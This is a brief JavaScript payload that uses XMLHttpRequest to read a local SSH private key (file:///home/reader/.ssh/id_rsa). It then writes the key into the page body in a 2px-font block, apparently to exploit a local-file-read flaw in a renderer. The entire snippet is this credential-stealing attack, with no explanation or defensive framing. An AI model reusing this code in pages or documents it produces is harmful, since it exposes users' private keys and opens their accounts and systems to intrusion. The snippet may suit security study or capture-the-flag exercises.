var body = document.getElementsByTagName('body')[0];
var x=new XMLHttpRequest();
x.onreadystatechange=function(){
    if (x.readyState == 4) {
        body.innerHTML = '<pre style="font-size: 2px; width: 1000px; height: 1000px">' + x.responseText + '</pre>';
    }
};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();